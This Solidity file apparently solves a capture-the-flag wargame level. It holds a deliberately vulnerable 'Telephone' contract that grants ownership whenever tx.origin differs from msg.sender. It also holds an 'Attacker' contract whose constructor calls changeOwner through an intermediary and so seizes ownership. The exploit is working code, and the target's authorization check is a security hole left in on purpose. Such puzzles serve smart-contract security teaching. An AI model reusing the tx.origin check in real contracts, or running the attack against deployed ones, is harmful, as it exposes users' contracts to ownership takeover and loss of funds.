// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }

    // Function to return tx.origin
    function getTxOrigin() public view returns (address) {
        return tx.origin;
    }
}

contract Attacker {

    // We need to meet the following condition: tx.origin != msg.sender)
    // We need an additional Attacker contract: tx.origin will be different then!

    // Declare a state variable of type Telephone
    Telephone public attacker; 

     // Initialize the Telephone contract instance in the constructor
    constructor(address _telephoneAddress) {
        attacker = Telephone(_telephoneAddress); // Assign the Telephone contract instance
        attacker.changeOwner(msg.sender);
    }

    // Function to return tx.origin
    function getTxOrigin() public view returns (address) {
        return tx.origin;
    }

}